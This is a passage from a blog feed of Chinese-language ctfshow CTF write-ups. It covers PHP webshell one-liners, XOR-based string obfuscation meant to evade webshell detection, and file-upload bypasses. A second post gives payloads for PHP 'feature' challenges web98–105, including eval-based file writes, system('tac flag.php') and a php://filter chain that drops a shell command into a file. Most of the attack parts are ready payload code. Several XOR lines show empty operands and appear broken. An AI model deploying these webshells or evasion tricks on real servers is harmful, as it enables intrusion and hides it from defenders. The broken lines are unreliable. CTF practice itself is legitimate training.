important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>更多的关于免杀</p>\n<ol>\n<li>\n<p>字符串拼接</p>\n</li>\n<li>\n<p>利用异或，使用其他符号构建字符串 如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//ABCDEFG</span></pre></td></tr></tbody></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span>  <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>(<span class=\"token interpolation\"><span class=\"token variable\">$b</span></span>)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$d</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//abcdefg</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$e</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">11</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//hijklmn</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">19</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//opqrst</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$g</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">22</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">23</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//uvwxyz</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$h</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'!'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\"'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'#'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'$'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'%'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'('</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">')'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'*'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'+'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'-'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'2'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'3'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'4'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$k</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'5'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'6'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'7'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'8'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'9'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">':'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$l</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\t'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$A</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span> <span class=\"token operator\">&lt;=</span> <span class=\"token string single-quoted-string\">'o'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$$A</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure></li>\n</ol>\n</li>\n</ul>\n<p>web161  <code>content-type</code>  为 <code>png</code> ，文件头为 <code>GIF89a</code>  绕过</p>\n<p>web166 上传 zip，然后输入一句话</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/98069c85/",
            "url": "http://dpm12345.cn/posts/98069c85/",
            "title": "php 特性",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-98\"><a href=\"#web-98\" class=\"headerlink\" title=\"web 98\"></a>web 98</h1><p>根据源码，可知，当传入get参数时。会将get改为post参数（后面的get会变成post，即highlight_file()的判断get参数时，会判断post参数下的值)</p>\n<p>所以说该题的解是，先随便传入一个get值，之后通过post传入<code>HTTP_FLAG=flag</code></p>\n<h1 id=\"web-99\"><a href=\"#web-99\" class=\"headerlink\" title=\"web 99\"></a>web 99</h1><p>关键在于</p>\n<pre><code class=\"php\">if (isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)) {\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n</code></pre>\n<p>这题主要是运用了<code>in_array()</code>的弱类型匹配</p>\n<p>故可以写</p>\n<pre><code class=\"raw\">?n=1.php\ncontent=&lt;?php eval($GET[1]);?&gt;\n1=systme('ls');\n1=system('tac flag.php');\n</code></pre>\n<h1 id=\"web-100\"><a href=\"#web-100\" class=\"headerlink\" title=\"web 100\"></a>web 100</h1><p><code>$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code></p>\n<p>这是一个赋值加逻辑语句，而赋值优先级大于逻辑，故<code>v0</code>首先被赋值，后进行逻辑判断</p>\n<p>故<code>v0</code>的值只与<code>v1</code>的值有关，而后面<code>v2</code>和<code>v3</code>可以任意选</p>\n<p>这里由于只有<code>eval(\"$v2('ctfshow')$v3\");</code></p>\n<p>故采用<code>var_dump</code>函数打印，</p>\n<pre><code class=\"php\">payload1:\n?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;\n\npayload2: ?v1=1&amp;v2=eval($_POST[1])?&gt;&amp;v3=;\n1=highlight_file('ctfshow.php');\n</code></pre>\n<h1 id=\"web-101\"><a href=\"#web-101\" class=\"headerlink\" title=\"web 101\"></a>web 101</h1><p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web101.png\"></p>\n<p>改为这个</p>\n<p>利用反射机制</p>\n<p><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code></p>\n<h1 id=\"web-102\"><a href=\"#web-102\" class=\"headerlink\" title=\"web 102\"></a>web 102</h1><p>只有一种解，查看wp为</p>\n<p>对</p>\n<pre><code class=\"raw\">&lt;?=`cat *`;\n</code></pre>\n<p>base64编码后，删去末尾”=”,然后进行hex编码，可得到<code>5044383959474e6864434171594473</code>，恰好有<code>e</code>，可以用科学计数法绕过<code>v2</code>的数字判断，而<code>v1</code>可以传入<code>hex2bin</code>将十六进制转回base64，<code>v3</code>使用 <code>filter base64</code>写入文件，</p>\n<p>payload</p>\n<pre><code class=\"php\">?v2=115044383959474e6864434171594473&amp;v3=php://filter/convert.base64-decode/resource=web102_2.php\nv1=hex2bin\n</code></pre>\n<h1 id=\"web-103\"><a href=\"#web-103\" class=\"headerlink\" title=\"web 103\"></a>web 103</h1><p>同web 102做法</p>\n<h1 id=\"web-104\"><a href=\"#web-104\" class=\"headerlink\" title=\"web 104\"></a>web 104</h1><ol>\n<li>没有判断两值相同的情况，可分别赋一样的值得到flag</li>\n<li>由于shal对数组类型数据不能处理，返回false，因此也可以用数组绕过</li>\n<li></li>\n</ol>\n<h1 id=\"web-105\"><a href=\"#web-105\" class=\"headerlink\" title=\"web 105\"></a>web 105</h1><p>这题主要考虑对变量重新赋值的操作</p>\n<pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error = '你还想要flag嘛？';\n$suces = '既然你想要那给你吧！';\nforeach ($_GET as $key =&gt; $value) {        \n    if ($key === 'error') {                  \n        die(\"what are you doing?!\");\n    }\n    $$key = $$value;                   \n}\nforeach ($_POST as $key =&gt; $value) {    \n    if ($value === 'flag') {            \n        die(\"what are you doing?!\");\n    }\n    $$key = $$value;                  \n}\nif (!($_POST['flag'] == $flag)) {\n    die($error);\n}\necho \"your are good\" . $flag . \"\\n\";   \ndie($suces);\n</code></pre>\n<p>对<code>foreach()</code>中的参数进行研究，对于传入的GET值，键对应key，内容对应value；</p>\n<p>而之后的<code> $$key = $$val</code>, 则是对某一变量的重新赋值(或者创建一个变量)</p>\n<p>如 